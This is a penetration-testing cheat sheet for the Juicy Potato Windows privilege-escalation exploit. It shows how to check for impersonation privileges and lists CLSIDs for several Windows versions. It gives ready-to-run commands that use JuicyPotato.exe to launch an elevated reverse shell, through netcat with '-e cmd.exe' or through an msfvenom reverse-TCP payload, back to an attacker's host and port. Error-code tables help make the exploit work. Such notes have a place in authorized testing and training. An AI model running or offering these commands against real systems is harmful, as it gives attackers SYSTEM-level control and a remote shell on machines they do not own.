# Juicy Potato

## Check privileges

```
whoami /priv
```

The required privileges are `SeImpersonate` and/or `SeAssignPrimaryToken.` It doesn't matter if their status is disabled.

## Exploiting

Get the script from here: [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)

```
JuicyPotato.exe -l 9999 -p <process> -a "<arguments>" -t * -c '<CLID>'
```

### Elevated reverse shell

Get NC.exe from here: [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

```
JuicyPotato.exe -l 6666 -p <path to nc.exe> -a "-nv <LHOST> <LPORT> -e cmd.exe" -t *
```

### Local payload

```
msfvenom -p windows/<arch>/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe
JuicyPotato.exe -l 6666 -p c:\Windows\System32\cmd.exe -t * -a "/c c:\<path to shell.exe>"
```

### List of CLIDS

* [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_7\_Enterprise)
* [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_8.1\_Enterprise)
* [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_10\_Enterprise)
* [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows\_10\_Pro)
* [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2008\_R2\_Enterprise)
* [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2012\_Datacenter)
* [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows\_Server\_2016\_Standard)

## Troubleshooting

### CreateProcess error codes:

| Code | Meaning            | Comment                                                                                                                              |
| ---- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------ |
| 2    | File not found     | no executable file is found in the given path, check the .exe name and make sure the file is not corrupt                             |
| 3    | Path not found     | check the path to the executable, avoid using spaces and symbols                                                                     |
| 5    | Access denied      | the current user doesn't have the privileges to invoke this function, may also be caused by anti-virus software blocking the exploit |
| 123  | Invalid name       | avoid using characters such as `',."-#()<>` in the path                                                                              |
| 1314 | Privilege not held | the current user lacks the necessary token to perform this operation                                                                 |

### recv failure:

| Code  | Meaning      | Comment                           |
| ----- | ------------ | --------------------------------- |
| 10038 | Not a socket | Try using another port or service |

